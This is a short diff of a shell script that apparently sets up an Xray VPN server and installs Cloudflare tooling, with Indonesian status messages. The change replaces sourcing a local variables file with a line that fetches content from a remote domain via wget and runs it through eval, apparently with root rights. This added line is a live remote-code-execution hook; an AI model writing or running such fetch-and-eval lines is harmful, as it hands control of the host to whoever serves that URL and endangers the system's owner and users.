@@ -5,7 +5,7 @@ source /usr/bin/ui.sh
 
 NAME=$(cat /etc/xray/username)
 
-source /usr/bin/var.conf
+eval $(wget -qO- https://domainsaya.dekaa.my.id)
 if ! command -v jq &> /dev/null; then
     echo -e "Tunggu sebentar proses. Menginstall Cloudflare..."
     apt install jq -y >/dev/null
